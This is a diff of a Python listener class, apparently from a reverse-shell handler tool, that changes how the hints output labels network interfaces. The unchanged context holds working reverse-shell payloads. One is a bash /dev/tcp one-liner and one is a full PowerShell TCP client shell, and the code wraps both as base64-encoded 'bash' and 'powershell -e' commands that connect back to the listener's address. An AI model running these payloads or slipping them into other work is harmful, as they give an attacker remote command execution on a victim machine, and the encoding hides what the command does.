@@ -1671,7 +1671,7 @@ class Listener:
 
 	@property
 	def hints(self):
-
+		interfaces = Interfaces().list
 		presets = [
 			"setsid bash >& /dev/tcp/{}/{} 0>&1 &",
 			'$client = New-Object System.Net.Sockets.TCPClient("{}",{});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()' # Taken from revshells.com
@@ -1682,10 +1682,11 @@ class Listener:
 		ips = [self.host]
 
 		if self.host == '0.0.0.0':
-			ips = [ip for ip in Interfaces().list.values()]
+			ips = [ip for ip in interfaces.values()]
 
 		for ip in ips:
-			output.extend(('➤  ' + str(paint(ip).CYAN) + ":" + str(paint(self.port).red), ''))
+			iface_name = {v: k for k, v in interfaces.items()}.get(ip)
+			output.extend((f'➤  {str(paint(iface_name).GREEN)} → {str(paint(ip).cyan)}:{str(paint(self.port).red)}', ''))
 			output.append(f"echo -n {base64.b64encode(presets[0].format(ip, self.port).encode()).decode()}|base64 -d|bash")
 			output.append("")
 			output.append("cmd /c powershell -e " + base64.b64encode(presets[1].format(ip, self.port).encode("utf-16le")).decode())
